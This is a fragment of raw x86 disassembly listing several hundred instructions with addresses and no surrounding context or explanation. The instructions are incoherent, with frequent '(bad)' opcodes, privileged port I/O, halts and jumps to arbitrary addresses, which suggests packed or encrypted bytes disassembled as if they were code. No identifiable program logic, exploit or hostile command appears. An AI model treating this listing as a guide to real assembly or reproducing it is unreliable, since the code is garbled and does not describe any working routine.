  4126c3:	dec    edi
  4126c4:	loop   0x41272b
  4126c6:	(bad)  [edi-0x1c]
  4126c9:	cmp    eax,DWORD PTR [edi-0x34]
  4126cc:	jle    0x412718
  4126ce:	sti    
  4126cf:	ins    BYTE PTR es:[edi],dx
  4126d0:	lods   eax,DWORD PTR ds:[esi]
  4126d1:	sub    ah,dh
  4126d3:	push   eax
  4126d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d5:	and    edx,ecx
  4126d7:	inc    edx
  4126d8:	test   BYTE PTR [edi+eiz*2],dh
  4126db:	out    0x4c,eax
  4126dd:	ror    DWORD PTR [ebp+edi*1-0x7e],1
  4126e1:	cmc    
  4126e2:	add    bx,WORD PTR [ebx]
  4126e5:	ds and al,0x43
  4126e8:	enter  0x677c,0xe0
  4126ec:	(bad)  
  4126ee:	out    dx,al
  4126ef:	or     dh,BYTE PTR [esi-0x6]
  4126f2:	rcr    BYTE PTR [eax+edx*2+0x57],cl
  4126f6:	mov    al,BYTE PTR [eax-0x1c]
  4126f9:	aam    0xa9
  4126fb:	jmp    0x4126df
  4126fd:	fucomip st,st(5)
  4126ff:	cmp    al,0x7d
  412701:	mov    al,ds:0xb62c1e2d
  412706:	xchg   ecx,eax
  412707:	(bad)  
  412708:	scas   al,BYTE PTR es:[edi]
  412709:	pop    ebp
  41270a:	aam    0xeb
  41270c:	(bad)  
  41270d:	xchg   ebx,eax
  41270e:	jge    0x412770
  412710:	and    ecx,DWORD PTR [ebx-0x56]
  412713:	ret    0x245f
  412716:	popf   
  412717:	(bad)  
  412718:	into   
  412719:	push   ebx
  41271a:	ror    esp,cl
  41271c:	popa   
  41271d:	in     al,dx
  41271e:	dec    edi
  412720:	add    al,0xc7
  412722:	pop    es
  412723:	jae    0x4126fb
  412725:	(bad)  
  412726:	cli    
  412727:	fsubr  st,st(2)
  412729:	or     al,0xef
  41272b:	ror    BYTE PTR [edi+0x2d8e5603],1
  412731:	sub    BYTE PTR [ebp+0x7c],dl
  412734:	ret    
  412735:	addr16 mov ebp,0x8eea0fc1
  41273b:	(bad)  
  41273c:	into   
  41273d:	push   edi
  41273e:	sub    dh,BYTE PTR [ebx+0x4df3e77c]
  412744:	scas   al,BYTE PTR es:[edi]
  412745:	sar    BYTE PTR [ebp-0x49940fb7],cl
  41274b:	jmp    0x7fd8:0xfbfc9d22
  412752:	xor    DWORD PTR [edi+0x19306c58],ebx
  412758:	sub    eax,0xc3f1135
  41275d:	xchg   edx,eax
  41275e:	loopne 0x4127c9
  412760:	iret   
  412761:	mov    bl,0xac
  412763:	ss push ds
  412765:	(bad)  
  412766:	add    al,0x13
  412768:	scas   eax,DWORD PTR es:[edi]
  412769:	jle    0x4127b0
  41276b:	mov    dh,0x21
  41276d:	sbb    al,0xcf
  41276f:	push   esi
  412770:	pop    ebp
  412771:	jg     0x412779
  412773:	mov    ah,0xe2
  412775:	mov    eax,gs:0x757ed59f
  41277b:	xchg   edx,eax
  41277c:	and    bh,al
  41277e:	xchg   edx,eax
  41277f:	inc    ecx
  412780:	and    al,0x52
  412782:	inc    eax
  412783:	scas   al,BYTE PTR es:[edi]
  412784:	push   ecx
  412785:	je     0x4127ba
  412787:	mov    esi,0x32ea4030
  41278c:	lahf   
  41278d:	das    
  41278e:	fadd   DWORD PTR [ebx]
  412790:	in     eax,0x9
  412792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412793:	ffree  st(6)
  412795:	cmp    al,0xf8
  412797:	sbb    al,0x55
  412799:	mov    BYTE PTR [esi-0x53f18d9b],0xef
  4127a0:	add    DWORD PTR [edx],edi
  4127a2:	ret    
  4127a3:	hlt    
  4127a4:	loop   0x412783
  4127a6:	(bad)  
  4127a7:	add    eax,0x2321f5a8
  4127ac:	pop    ecx
  4127ad:	int3   
  4127ae:	or     DWORD PTR [eax],ebp
  4127b0:	cmp    DWORD PTR [ebx],edx
  4127b2:	mov    cl,0x2b
  4127b4:	lock dec ebx
  4127b6:	mov    ebx,0xe32d2aaf
  4127bb:	iret   
  4127bc:	xchg   ebx,eax
  4127bd:	push   ds
  4127be:	adc    edi,edi
  4127c0:	jnp    0x4127fb
  4127c2:	xor    al,0x55
  4127c4:	data16 int3 
  4127c6:	push   esi
  4127c7:	or     eax,0xd48ed714
  4127cc:	pop    eax
  4127cd:	dec    DWORD PTR [esi]
  4127cf:	loopne 0x4127fa
  4127d1:	adc    ah,BYTE PTR [esi+eiz*4+0x79]
  4127d5:	gs repnz hlt 
  4127d8:	cs mov dh,0x18
  4127db:	mov    edx,0xc51eb715
  4127e0:	cmp    esi,DWORD PTR [ecx]
  4127e2:	ins    DWORD PTR es:[edi],dx
  4127e3:	add    BYTE PTR [edx],bh
  4127e5:	dec    esp
  4127e6:	ss jle 0x41284a
  4127e9:	sub    eax,esp
  4127eb:	dec    ebp
  4127ec:	out    0x29,eax
  4127ee:	fcmovnb st,st(0)
  4127f0:	add    ebp,DWORD PTR [esi+0x19425f8]
  4127f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127f7:	popf   
  4127f8:	out    0x0,al
  4127fa:	add    al,0xa
  4127fc:	mov    bl,0xb2
  4127fe:	jae    0x4127d0
  412800:	xchg   edx,eax
  412801:	je     0x41278d
  412803:	mov    DWORD PTR [esi+eiz*1+0x4f52f923],edi
  41280a:	in     al,dx
  41280b:	and    eax,0xa68521d0
  412810:	pop    ebp
  412811:	in     eax,dx
  412812:	retf   0x3200
  412815:	jnp    0x412820
  412817:	out    0xec,eax
  412819:	jnp    0x412824
  41281b:	dec    edi
  41281c:	and    al,0xb6
  41281e:	loop   0x412839
  412820:	xor    BYTE PTR [ebx],ah
  412822:	pusha  
  412823:	xor    BYTE PTR [ebx-0x52],0x59
  412827:	mov    ds:0x5916769e,al
  41282c:	dec    ebp
  41282d:	and    edi,eax
  41282f:	in     eax,0x53
  412831:	ds or  eax,0x27ea4f9d
  412837:	shr    dh,1
  412839:	pop    es
  41283a:	or     eax,0x6ac43796
  41283f:	std    
  412840:	jae    0x4127e0
  412842:	dec    ax
  412844:	out    dx,al
  412845:	mov    esi,ecx
  412847:	aaa    
  412848:	mov    dl,0x6b
  41284a:	pop    ds
  41284b:	mov    eax,0xc5812591
  412850:	or     ebp,edx
  412852:	dec    ebp
  412853:	inc    ebp
  412854:	xor    eax,0xbcbab570
  412859:	mov    DWORD PTR [ecx-0x64],edi
  41285c:	sbb    al,ch
  41285e:	loop   0x412876
  412860:	lock out dx,al
  412862:	ins    DWORD PTR es:[edi],dx
  412863:	sbb    eax,edi
  412865:	xchg   edx,eax
  412866:	imul   ebx,DWORD PTR ds:0xe7598ee2,0xffffffec
  41286d:	dec    eax
  41286e:	data16 cmc 
  412870:	stos   BYTE PTR es:[edi],al
  412871:	mov    dh,0x4f
  412873:	nop
  412874:	aad    0x85
  412876:	(bad)  
  412878:	or     ebx,edx
  41287a:	out    0x2d,eax
  41287c:	sub    BYTE PTR [ebp-0x4081de7c],dh
  412882:	sbb    al,0x2e
  412884:	fisttp DWORD PTR [ebx-0x2e20e97c]
  41288a:	pop    eax
  41288b:	je     0x41288f
  41288d:	push   esp
  41288e:	xor    DWORD PTR [esi+0x359b53c],edx
  412894:	addr16 mov esi,0xe863a85a
  41289a:	dec    esi
  41289b:	lods   eax,DWORD PTR ds:[esi]
  41289c:	sahf   
  41289d:	inc    esp
  41289e:	cmp    dl,bl
  4128a0:	push   0xdace7ea9
  4128a5:	(bad)  
  4128a6:	gs mov edi,0x91c6194c
  4128ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128ad:	sbb    al,0xe2
  4128af:	cli    
  4128b0:	pop    ss
  4128b1:	push   ebx
  4128b2:	sbb    bh,ah
  4128b4:	pop    edi
  4128b5:	xchg   BYTE PTR [edx-0x23],al
  4128b8:	cld    
  4128b9:	pop    es
  4128ba:	sbb    dl,dh
  4128bc:	and    edi,eax
  4128be:	push   ebx
  4128bf:	xchg   edi,eax
  4128c0:	int3   
  4128c1:	mov    al,0x9b
  4128c3:	push   cs
  4128c4:	call   0x8c7e5de5
  4128c9:	push   esp
  4128ca:	inc    edx
  4128cb:	dec    ebx
  4128cc:	fld    QWORD PTR [ebx-0x68]
  4128cf:	mov    ds:0xcb8a0e1a,al
  4128d4:	cmp    eax,DWORD PTR [edx]
  4128d6:	outs   dx,DWORD PTR ds:[esi]
  4128d7:	jns    0x412875
  4128d9:	mov    edi,0x86ecfbe4
  4128de:	icebp  
  4128df:	xchg   ebp,eax
  4128e0:	inc    esp
  4128e1:	mov    ah,0xdf
  4128e3:	add    al,0x7c
  4128e5:	fadd   QWORD PTR [edx+0x52531ce4]
  4128eb:	rcl    DWORD PTR ds:0x87439260,1
  4128f1:	lds    ebx,FWORD PTR [esi+0x65]
  4128f4:	aaa    
  4128f5:	dec    edi
  4128f6:	push   ecx
  4128f7:	shl    BYTE PTR [eax],cl
  4128f9:	fbld   TBYTE PTR [edx+0x3b]
  4128fc:	ret    
  4128fd:	popa   
  4128fe:	arpl   si,bp
  412900:	mov    eax,ds:0x7b601800
  412905:	inc    ebp
  412906:	loope  0x412899
  412908:	and    eax,0xeece6acb
  41290d:	outs   dx,BYTE PTR ds:[esi]
  41290e:	cdq    
  41290f:	push   es
  412910:	push   ecx
  412911:	or     esi,DWORD PTR ds:0xc1884caa
  412917:	inc    ecx
  412918:	cmp    esi,DWORD PTR [ebx+0x3ca6022a]
  41291e:	sub    BYTE PTR [ebx+0xcb84102],ah
  412924:	push   esi
  412925:	out    dx,al
  412926:	inc    edx
  412927:	add    bl,dh
  412929:	popa   
  41292a:	inc    ecx
  41292b:	inc    edx
  41292c:	sub    al,0xc2
  41292e:	xchg   esi,eax
  41292f:	in     al,dx
  412930:	jbe    0x412922
  412932:	ror    BYTE PTR [ebx],0xc6
  412935:	(bad)  
  412936:	mov    dl,0xc9
  412938:	push   ds
  412939:	or     cl,bh
  41293b:	adc    esi,DWORD PTR [ecx]
  41293d:	cmp    esp,eax
  41293f:	retf   0x1402
  412942:	xor    al,0x44
  412944:	addr16 test ebx,edx
  412947:	rcl    ebx,cl
  412949:	xchg   ebp,eax
  41294a:	cmp    DWORD PTR [ebx+0x580a09c],0xffffffb6
  412951:	jecxz  0x4128ee
  412953:	mov    BYTE PTR [eax+0x42],bh
  412956:	aad    0x9d
  412958:	mov    ebx,0x82108036
  41295d:	adc    BYTE PTR [ebp+0x465cbc3f],al
  412963:	pop    esi
  412964:	push   esp
  412965:	xchg   ebx,eax
  412966:	lods   eax,DWORD PTR ds:[esi]
  412967:	aaa    
  412968:	xchg   ebp,eax
  412969:	mov    ds:0xb3ce1aef,al
  41296e:	pop    esi
  41296f:	lock mov bl,BYTE PTR [eax]
  412972:	pop    edx
  412973:	jmp    0xc5200fd4
  412978:	call   DWORD PTR [ebx+0x7b]
  41297b:	loopne 0x4128ff
  41297d:	sar    BYTE PTR [ebx-0x3959a94],cl
  412983:	mov    ecx,0xcca874db
  412988:	xchg   bl,cl
  41298a:	jg     0x41293f
  41298c:	repz test al,0x58
  41298f:	mov    WORD PTR [ebp+0x42],ss
  412992:	daa    
  412993:	fisub  WORD PTR [eax]
  412995:	and    al,0x4c
  412997:	(bad)  
  412998:	cli    
  412999:	push   es
  41299a:	ror    esi,1
  41299c:	mov    ecx,0xf1116eef
  4129a1:	push   ebx
  4129a2:	data16 js 0x412a0a
  4129a5:	push   0xe7508dd4
  4129aa:	sbb    eax,0x63543716
  4129af:	test   BYTE PTR [eax],dh
  4129b1:	cmp    eax,0x7c256d2d
  4129b6:	mov    eax,ds:0x437fb8a6
  4129bb:	(bad)  
  4129bd:	sbb    ch,ch
  4129bf:	div    DWORD PTR [esi]
  4129c1:	ins    BYTE PTR es:[edi],dx
  4129c2:	loopne 0x41298c
  4129c4:	mov    ch,0xa4
  4129c6:	fild   QWORD PTR [ebp+0x46fe5d9e]
  4129cc:	xchg   ebx,eax
  4129cd:	pop    ebp
  4129ce:	and    bl,bh
  4129d0:	cmp    eax,0x6a921228
  4129d5:	xlat   BYTE PTR ds:[ebx]
  4129d6:	int    0xf
  4129d8:	bound  esi,QWORD PTR [eax+0x5c76830b]
  4129de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129df:	pop    ebp
  4129e0:	ds ret 0xd759
  4129e4:	and    BYTE PTR ds:0x35e15459,al
  4129ea:	mov    eax,ds
  4129ec:	rcl    DWORD PTR [esi-0x1ce17eb2],cl
  4129f2:	pusha  
  4129f3:	scas   eax,DWORD PTR es:[edi]
  4129f4:	xor    eax,0x9412e196
  4129f9:	sti    
  4129fa:	mov    ds:0x195eb0b,al
  4129ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a00:	sub    DWORD PTR [eax-0x21],ebx
  412a03:	pop    edi
  412a04:	push   cs
  412a05:	push   esp
  412a06:	push   cs
  412a07:	adc    edx,DWORD PTR [esi+edi*2-0x70]
  412a0b:	mov    eax,0x20aa0fde
  412a10:	jne    0x4129f4
  412a12:	mov    esi,0xc1915e47
  412a17:	inc    esp
  412a18:	jl     0x412a73
  412a1a:	and    eax,0x82e34895
  412a1f:	dec    eax
  412a20:	jg     0x412a17
  412a22:	test   BYTE PTR [ecx],al
  412a24:	out    0xe6,al
  412a26:	mov    al,BYTE PTR [ebp-0x61bb4ce0]
  412a2c:	daa    
  412a2d:	lods   al,BYTE PTR ds:[esi]
  412a2e:	arpl   dx,cx
  412a30:	mov    ecx,0x8364fc08
  412a35:	ficomp DWORD PTR [edx]
  412a37:	add    DWORD PTR [ebp+0xac78efc],edi
  412a3d:	stos   DWORD PTR es:[edi],eax
  412a3e:	cmp    al,0xcd
  412a40:	fwait
  412a41:	sub    eax,0x683aa290
  412a46:	mov    ds:0x2c251147,eax
  412a4b:	enter  0x750a,0x64
  412a4f:	cld    
  412a50:	leave  
  412a51:	hlt    
  412a52:	rcr    eax,0xb
  412a55:	sbb    eax,0x88f77ac6
  412a5a:	mov    eax,ds:0xb87395f1
  412a5f:	xchg   edx,eax
  412a60:	cwde   
  412a61:	sbb    BYTE PTR [edx+0x40],0x67
  412a65:	xchg   BYTE PTR [ebx*8-0x8bda5f1],cl
  412a6c:	xor    cl,cl
  412a6e:	xlat   BYTE PTR ds:[ebx]
  412a6f:	mov    ecx,0xc149e349
  412a74:	jno    0x412a84
  412a76:	or     dh,BYTE PTR [edi-0x64]
  412a79:	call   ecx
  412a7b:	call   ecx
  412a7d:	cli    
  412a7e:	pop    ebp
  412a7f:	loope  0x412a3d
  412a81:	lea    ebp,[edx+edx*4]
  412a84:	ficomp DWORD PTR [ebp-0x181d3f0e]
  412a8a:	test   eax,0x373fd4c1
  412a8f:	idiv   DWORD PTR [esi-0x5b]
  412a92:	ss xchg edi,eax
  412a94:	sbb    al,0xd5
  412a96:	push   ecx
  412a97:	add    esi,esi
  412a99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a9a:	les    ebx,FWORD PTR [ecx]
  412a9c:	fisttp QWORD PTR [edx-0x398d255a]
  412aa2:	lea    esi,[ecx]
  412aa4:	jle    0x412a61
  412aa6:	imul   ebx,DWORD PTR [ebx],0x57e46504
  412aac:	div    BYTE PTR [eax+ecx*8-0x3f6818fa]
  412ab3:	xor    edi,ecx
  412ab5:	jbe    0x412a7b
  412ab7:	je     0x412a7b
  412ab9:	adc    DWORD PTR [edi-0x67547bbd],0x7c6d07e1
  412ac3:	(bad)  
  412ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ac5:	and    ecx,ebp
  412ac7:	jnp    0x412a75
  412ac9:	add    ebp,esi
  412acb:	or     DWORD PTR ds:0x59e744b,ebx
  412ad1:	pop    es
  412ad2:	(bad)  
  412ad3:	lock push ds
  412ad5:	daa    
  412ad6:	mov    eax,ds:0x952f4e9
  412adb:	xor    al,0xbf
  412add:	pop    ebx
  412ade:	out    dx,al
  412adf:	enter  0x26bf,0xf5
  412ae3:	mov    ds:0x37812168,al
  412ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ae9:	inc    ecx
  412aea:	add    esp,DWORD PTR [ebp-0x3c]
  412aed:	test   DWORD PTR [ecx+0x76fa5e40],edi
  412af3:	inc    ebx
  412af4:	sub    bh,BYTE PTR [edx+0x11]
  412af7:	ret    
  412af8:	cld    
  412af9:	add    al,0x83
  412afb:	cmp    bl,BYTE PTR [edx+0xc]
  412afe:	cmp    DWORD PTR cs:[edx],edx
  412b01:	xchg   DWORD PTR [edi+0x2caaffe1],edi
  412b07:	ins    BYTE PTR es:[edi],dx
  412b08:	in     al,dx
  412b09:	mov    BYTE PTR [edi-0x1374580f],cl
  412b0f:	xadd   BYTE PTR [esi],bl
  412b12:	sbb    dh,BYTE PTR [edi]
  412b14:	dec    ebx
  412b15:	mov    ch,0xe0
  412b17:	sar    BYTE PTR es:[esi],1
  412b1a:	inc    eax
  412b1b:	js     0x412b17
  412b1d:	shl    BYTE PTR [edx],0xf2
  412b20:	int    0x60
  412b22:	loopne 0x412aec
  412b24:	fisub  DWORD PTR [ecx-0x38]
  412b27:	jb     0x412abf
  412b29:	mov    esi,esp
  412b2b:	push   cs
  412b2c:	push   eax
  412b2d:	sahf   
  412b2e:	dec    eax
  412b2f:	sub    eax,0xe121e797
  412b34:	inc    eax
  412b35:	or     al,0x1d
  412b37:	imul   esp,esp,0x49
  412b3a:	pop    esi
  412b3b:	add    eax,0x6150b76f
  412b40:	int    0xb4
  412b42:	jae    0x412bae
  412b44:	sahf   
  412b45:	push   ss
  412b46:	inc    edx
  412b47:	nop
  412b48:	mov    bl,0xfb
  412b4a:	cmp    edi,DWORD PTR [ecx]
  412b4c:	push   eax
  412b4d:	fld    QWORD PTR [eax+ebp*4+0x78]
  412b51:	dec    ecx
  412b52:	jmp    0xa176a7a1
  412b57:	jg     0x412b30
  412b59:	xchg   DWORD PTR [ebp-0x1e],esi
  412b5c:	js     0x412b09
  412b5e:	(bad)  [esp+esi*4+0x43]
  412b62:	or     eax,0x75cdf648
  412b67:	push   esi
  412b68:	ins    BYTE PTR es:[edi],dx
  412b69:	sub    al,0xc8
  412b6b:	popa   
  412b6c:	imul   edi,eax,0xaacc021f
  412b72:	xchg   DWORD PTR [ebx-0x6ce511d2],ebp
  412b78:	inc    edi
  412b79:	inc    esi
  412b7a:	cli    
  412b7b:	cld    
  412b7c:	lods   al,BYTE PTR ds:[esi]
  412b7d:	mov    eax,0x85883bd7
  412b82:	inc    ebp
  412b83:	inc    edx
  412b84:	imul   eax,DWORD PTR [edx-0x33276413],0xbbd97b47
  412b8e:	adc    DWORD PTR [ebp-0x2641bace],ebx
  412b94:	mov    al,0x4c
  412b96:	mov    eax,ds:0xcc6d6dfc
  412b9b:	(bad)  
  412b9c:	xchg   edx,eax
  412b9d:	les    ecx,FWORD PTR [esi-0x79]
  412ba0:	ficomp DWORD PTR [ebx]
  412ba2:	pop    esp
  412ba3:	inc    esp
  412ba4:	ds cmp eax,0x70557a74
  412baa:	test   BYTE PTR [ecx+ebx*1+0x3c],bh
  412bae:	retf   0x197d
  412bb1:	push   ecx
  412bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bb3:	sbb    edx,DWORD PTR [esi-0x13]
  412bb6:	iret   
  412bb7:	push   edx
  412bb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bb9:	jmp    eax
  412bbb:	push   ecx
  412bbc:	sahf   
  412bbd:	stos   DWORD PTR es:[edi],eax
  412bbe:	pop    ds
  412bbf:	cmp    esi,ecx
  412bc1:	gs jg  0x412bf5
  412bc4:	out    0xe8,eax
  412bc6:	or     esi,DWORD PTR [eax-0x28e32c3e]
  412bcc:	lock and al,BYTE PTR [edi+0x75e654ed]
  412bd3:	jecxz  0x412bfe
  412bd5:	scas   al,BYTE PTR es:[edi]
  412bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bd7:	jge    0x412c0d
  412bd9:	ins    BYTE PTR es:[edi],dx
  412bda:	adc    al,BYTE PTR [ebp+0x44]
  412bdd:	push   ecx
  412bde:	push   edx
  412bdf:	sbb    BYTE PTR [ebx+0x79],bh
  412be2:	sbb    BYTE PTR [edx-0x7b210a51],ah
  412be8:	lods   al,BYTE PTR ds:[esi]
  412be9:	addr16 fwait
  412beb:	retf   
  412bec:	dec    esi
  412bed:	and    BYTE PTR [edi+esi*2-0x80],ch
  412bf1:	out    0xac,al
  412bf3:	dec    edx
  412bf4:	enter  0x851b,0xcf
  412bf8:	or     ah,BYTE PTR [edi]
  412bfa:	stc    
  412bfb:	xchg   edx,eax
  412bfc:	inc    edi
  412bfd:	sbb    al,0x99
  412bff:	mov    al,ds:0xc09edb36
  412c04:	ret    
  412c05:	sub    edi,DWORD PTR [ecx-0x752c62a9]
  412c0b:	adc    BYTE PTR [edx+ebx*1],0x16
  412c0f:	mov    al,ds:0xa0be06ff
  412c14:	cmp    DWORD PTR [edx+0x3720bff0],ebp
  412c1a:	push   ss
  412c1b:	push   edx
  412c1c:	les    edi,FWORD PTR [eax]
  412c1e:	cmp    al,bl
  412c20:	jb     0x412be1
  412c22:	sub    BYTE PTR [ebp+0x69],dl
  412c25:	imul   ebp,DWORD PTR [ebx-0xc4e4eb5],0xffffff8b
  412c2c:	test   eax,0x60b89dcd
  412c31:	jg     0x412c0d
  412c33:	jbe    0x412c03
  412c35:	int    0xd9
  412c37:	leave  
  412c38:	mov    esp,DWORD PTR [edx+eiz*1]
  412c3b:	push   ebp
  412c3c:	das    
  412c3d:	ins    DWORD PTR es:[edi],dx
  412c3e:	dec    edx
  412c3f:	fs cmc 
  412c41:	add    DWORD PTR [ebx-0x25],edx
  412c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c45:	inc    edx
  412c46:	test   DWORD PTR [ebx+0x3d],0xf03be539
  412c4d:	push   ecx
  412c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c4f:	xchg   ebp,eax
  412c50:	and    ebx,DWORD PTR [edi-0x41]
  412c53:	nop
  412c54:	aaa    
  412c55:	jp     0x412c13
  412c57:	sub    DWORD PTR [eax],eax
  412c59:	dec    esp
  412c5a:	sub    dl,BYTE PTR [ebx-0xd]
  412c5d:	mov    eax,ds:0xaaa818fa
  412c62:	rol    DWORD PTR [eax],cl
  412c64:	fst    QWORD PTR [ebx-0x515f37e7]
  412c6a:	xor    bh,BYTE PTR [ebx+0x44db588]
  412c70:	xor    al,0x1d
  412c72:	test   ecx,0x2f4a6d35
  412c78:	outs   dx,BYTE PTR ds:[esi]
  412c79:	sbb    ax,WORD PTR [edx]
  412c7c:	cmp    eax,DWORD PTR [edi]
  412c7e:	mov    eax,DWORD PTR [edx-0x5e]
  412c81:	add    BYTE PTR [ebx-0x6a1a584c],dh
  412c87:	test   BYTE PTR [ebx+0x290fd42],ch
  412c8d:	(bad)  
  412c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c8f:	dec    eax
  412c90:	xor    DWORD PTR [eax],0x753d81b8
  412c96:	mov    cl,0xfd
  412c98:	dec    ebp
  412c99:	xchg   BYTE PTR [esi+ebp*4-0x6c623ee9],bh
  412ca0:	xchg   esi,eax
  412ca1:	inc    esi
  412ca2:	rcl    DWORD PTR [ecx],cl
  412ca4:	mov    dl,0xdf
  412ca6:	stos   BYTE PTR es:[edi],al
  412ca7:	push   ds
  412ca8:	push   ecx
  412ca9:	gs lahf 
  412cab:	fnsave [edi+0x36]
  412cae:	and    al,0x3b
  412cb0:	rcl    BYTE PTR cs:[edi],0xd1
  412cb4:	bound  edx,QWORD PTR [edi]
  412cb6:	sahf   
  412cb7:	test   al,0x12
  412cb9:	cli    
  412cba:	ins    DWORD PTR es:[edi],dx
  412cbb:	bound  edx,QWORD PTR ds:0xa46b9235
  412cc1:	test   DWORD PTR [ebp-0x20],edx
  412cc4:	jns    0x412d38
  412cc6:	jae    0x412c67
  412cc8:	xchg   esi,eax
  412cc9:	leave  
  412cca:	and    eax,0x1cba0ea8
  412ccf:	mov    ch,0x85
  412cd1:	lods   al,BYTE PTR gs:[esi]
  412cd3:	call   0x45f9:0x1b663ef
  412cda:	xor    BYTE PTR [eax+0x21],dh
  412cdd:	mov    al,ds:0x836c1d2d
  412ce2:	nop
  412ce3:	ss int3 
  412ce5:	adc    ebp,DWORD PTR [ecx+0x6]
  412ce8:	cmp    eax,0x7ded5fc0
  412ced:	jl     0x412c71
  412cef:	pop    esp
  412cf0:	push   ss
  412cf1:	cmp    ch,BYTE PTR [edi-0x32]
  412cf4:	aaa    
  412cf5:	(bad)  
  412cf6:	aad    0xf9
  412cf8:	push   es
  412cf9:	xchg   ebp,eax
  412cfa:	adc    al,0x33
  412cfc:	xor    dh,bl
  412cfe:	push   ss
  412cff:	(bad)  
  412d00:	(bad)  
  412d02:	cdq    
  412d03:	jle    0x412d68
  412d05:	jo     0x412d2f
  412d07:	pop    eax
  412d08:	sti    
  412d09:	sbb    dh,BYTE PTR [ebp-0x98c6ae5]
  412d0f:	jno    0x412ce8
  412d11:	enter  0x3e84,0x7c
  412d15:	push   DWORD PTR [esi+0x2add65db]
  412d1b:	(bad)  [ecx]
  412d1d:	popf   
  412d1e:	out    0x91,al
  412d20:	mov    ebp,0x3cab1f0f
  412d25:	lds    edx,FWORD PTR [edx+esi*4+0x75]
  412d29:	ds mov edi,0x48f746b0
  412d2f:	dec    ecx
  412d30:	add    BYTE PTR [edi],dl
  412d32:	add    esp,DWORD PTR [esi]
  412d34:	push   ss
  412d35:	sbb    bl,BYTE PTR [edi+ecx*2+0x1565f52c]
  412d3c:	xchg   ebp,eax
  412d3d:	sub    DWORD PTR [esi+0x1dd764d7],esp
  412d43:	jl     0x412cf3
  412d45:	fisttp QWORD PTR [ecx+0x5f05e5e2]
  412d4b:	push   esp
  412d4c:	das    
  412d4d:	adc    al,0xc1
  412d4f:	lahf   
  412d50:	idiv   BYTE PTR [esi-0x260599d3]
  412d56:	inc    eax
  412d57:	js     0x412d6d
  412d59:	test   al,0xbf
  412d5b:	ins    DWORD PTR es:[edi],dx
  412d5c:	cdq    
  412d5d:	fstp   QWORD PTR [edx]
  412d5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d61:	add    BYTE PTR [edi+0x56],ch
  412d64:	lods   al,BYTE PTR ds:[esi]
  412d65:	push   ds
  412d66:	pusha  
  412d67:	pop    eax
  412d68:	mov    BYTE PTR [edx+ecx*1-0x35e3adfa],0x70
  412d70:	pop    esp
  412d71:	pusha  
  412d72:	es pop eax
  412d74:	push   ds
  412d75:	test   eax,0x2477cfdb
  412d7a:	inc    esi
  412d7b:	fidivr DWORD PTR [ebx]
  412d7d:	sub    DWORD PTR [edx+ecx*1+0x6b2ae02a],0xffffff94
  412d85:	dec    ebp
  412d86:	pop    ebx
  412d87:	shr    eax,cl
  412d89:	cwde   
  412d8a:	pop    eax
  412d8b:	aas    
  412d8c:	lods   eax,DWORD PTR ds:[esi]
  412d8d:	mov    al,ds:0x7887a8cd
  412d92:	popa   
  412d93:	pop    edi
  412d94:	jg     0x412d92
  412d96:	cmp    al,0xb3
  412d98:	mov    bl,0xca
  412d9a:	add    esp,DWORD PTR [esi+0x29]
  412d9d:	repz test BYTE PTR [ebx-0x2a552d3b],cl
  412da4:	add    al,0x96
  412da6:	ror    BYTE PTR ds:0x787ef4bf,0xc0
  412dad:	call   0x66de3969
  412db2:	out    0xdc,eax
  412db4:	sbb    al,0x13
  412db6:	dec    esp
  412db7:	sbb    al,BYTE PTR [eax+edi*4-0x42]
  412dbb:	pusha  
  412dbc:	and    eax,0xf356f979
  412dc1:	cmp    al,0xb5
  412dc3:	(bad)  
  412dc5:	(bad)  
  412dc6:	xor    eax,0x794ef2a7
  412dcb:	fisttp DWORD PTR [edx*4+0x24c67d05]
  412dd2:	sar    BYTE PTR [ebx+eiz*4-0x1f],0x66
  412dd7:	push   ebp
  412dd8:	dec    edx
  412dd9:	fs (bad) 
  412ddc:	in     al,dx
  412ddd:	jbe    0x412d8f
  412ddf:	mul    BYTE PTR [edx]
  412de1:	push   edi
  412de2:	push   fs
  412de4:	les    ebx,FWORD PTR [ebp-0x3146b4da]
  412dea:	cmp    cl,BYTE PTR [ebx+0x70]
  412ded:	jno    0x412dad
  412def:	dec    eax
  412df0:	mov    edi,0x88c65893
  412df5:	add    al,0xb3
  412df7:	mov    esp,0xb9eb760d
  412dfc:	pop    ss
  412dfd:	jmp    esp
  412dff:	sar    bh,cl
  412e01:	mov    eax,ds:0xd9364658
  412e06:	lods   al,BYTE PTR ds:[esi]
  412e07:	mov    edi,0x2bbead2
  412e0c:	mov    edx,0x3965f712
  412e11:	push   ss
  412e12:	mov    bh,0x41
  412e14:	in     eax,0xa4
  412e16:	cmp    al,0x7c
  412e18:	mov    WORD PTR [ebp-0x2891f209],gs
  412e1e:	xchg   BYTE PTR [esi],dh
  412e20:	and    BYTE PTR [ebx],cl
  412e22:	ret    0xd310
  412e25:	stos   BYTE PTR es:[edi],al
  412e26:	lds    edi,FWORD PTR [esi+0x58000839]
  412e2c:	push   ebp
  412e2d:	inc    eax
  412e2e:	in     al,0x98
  412e30:	pop    eax
  412e31:	pop    edi
  412e32:	xor    eax,0xebfc4cdb
  412e37:	mov    ebp,0xf15c490e
  412e3c:	retf   0x4207
  412e3f:	int    0xe6
  412e41:	rcr    BYTE PTR [edi],1
  412e43:	push   ss
  412e44:	mov    ss,WORD PTR [eax-0x377cc52d]
  412e4a:	push   eax
  412e4b:	sub    esp,DWORD PTR [eax]
  412e4d:	mov    dl,0x8
